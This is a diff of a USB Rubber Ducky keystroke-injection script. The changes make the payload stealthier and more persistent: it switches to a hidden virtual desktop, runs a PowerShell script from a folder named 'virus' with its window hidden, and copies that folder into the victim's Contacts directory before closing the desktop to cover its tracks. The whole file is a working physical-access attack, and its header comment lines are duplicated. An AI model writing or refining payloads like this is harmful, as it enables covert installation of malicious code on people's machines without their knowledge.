@@ -1,6 +1,9 @@
 REM Title:
 REM Author:
 REM Description:
+REM Title:
+REM Author:
+REM Description:
 REM Target:
 DEFINE #DELAYTIME 1000
 DEFINE #DRIVELABEL DUCKY
@@ -55,8 +58,10 @@ WAIT_FOR_CAPS_ON
 DELAY 250
 CAPSLOCK
 DELAY #DELAYTIME
+CTRL GUI d
+DELAY 750
 GUI r
-DELAY 300
+DELAY 500
 STRINGLN powershell
 REM_BLOCK
 CTRL-SHIFT-ENTER
@@ -66,4 +71,15 @@ ENTER
 END_REM
 DELAY 1000
 STRINGLN $driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='#DRIVELABEL'").DriveLetter; if ($driveLetter) {cd $driveLetter\virus}
-STRINGLN $driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='#DRIVELABEL'").DriveLetter; if ($driveLetter) {Start-Process powershell -ArgumentList "$driveletter\virus\event.ps1" }
+DELAY 200
+STRINGLN $driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='#DRIVELABEL'").DriveLetter; if ($driveLetter) {Start-Process powershell -ArgumentList "$driveletter\virus\event.ps1" -WindowStyle Hidden}
+DELAY 200
+STRINGLN $driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='#DRIVELABEL'").DriveLetter; if ($driveLetter) {New-Item -Path "c:\Users\$env:USERNAME\Contacts" -Name 'virus' -ItemType "directory"}
+DELAY 200
+STRINGLN $driveLetter = (Get-WmiObject -Query "SELECT * FROM Win32_Volume WHERE label='#DRIVELABEL'").DriveLetter; if ($driveLetter) {Copy-Item -Path "$driveLetter\virus\*" -Destination "C:\Users\$env:USERNAME\Contacts\virus"}
+DELAY 1000
+STRINGLN exit
+DELAY 250
+CTRL GUI-F4
+WAIT_FOR_BUTTON_PRESS
+RESTART_PAYLOAD
